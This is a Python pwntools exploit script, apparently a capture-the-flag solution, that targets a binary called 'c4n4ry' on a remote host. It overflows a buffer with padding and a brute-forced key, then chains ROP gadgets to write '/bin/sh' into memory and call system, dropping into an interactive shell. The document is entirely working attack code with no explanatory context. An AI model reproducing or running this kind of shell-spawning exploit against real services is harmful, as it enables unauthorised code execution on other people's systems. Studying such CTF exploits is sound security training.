from pwn import *

elf = ELF("./c4n4ry")
io = remote("134.209.157.250",5084)
start = 'a'
system_addr = elf.symbols["system"]
payload = "A" * 192

pop_r12_ret = 0x0000000000400936
pop_r11_ret = 0x0000000000400933
write       = 0x0000000000602000
pop_rdi_ret = 0x0000000000400939
mov_r11_r12 = 0x0000000000400927

for i in range(0,23):
    io.recvuntil("Tell me your name : ")
    io.sendline("1")
    io.recvuntil("input:")
    io.sendline("1")
    key = start + chr(ord(start)+1) + chr(ord(start)+2) + chr(ord(start)+3)
    start = chr(ord(start)+1)
    payload += key
    payload += "A" * 12 + p64(0xdeadfeed)
    payload += p64(pop_r12_ret)
    payload += "/bin/sh\x00"
    payload += p64(pop_r11_ret)
    payload += p64(write)
    payload += p64(mov_r11_r12)
    payload += p64(pop_rdi_ret)
    payload += p64(write)
    payload += p64(system_addr)
    io.sendline(payload)
    io.recvuntil("input:")
    io.sendline("2")
    io.interactive()
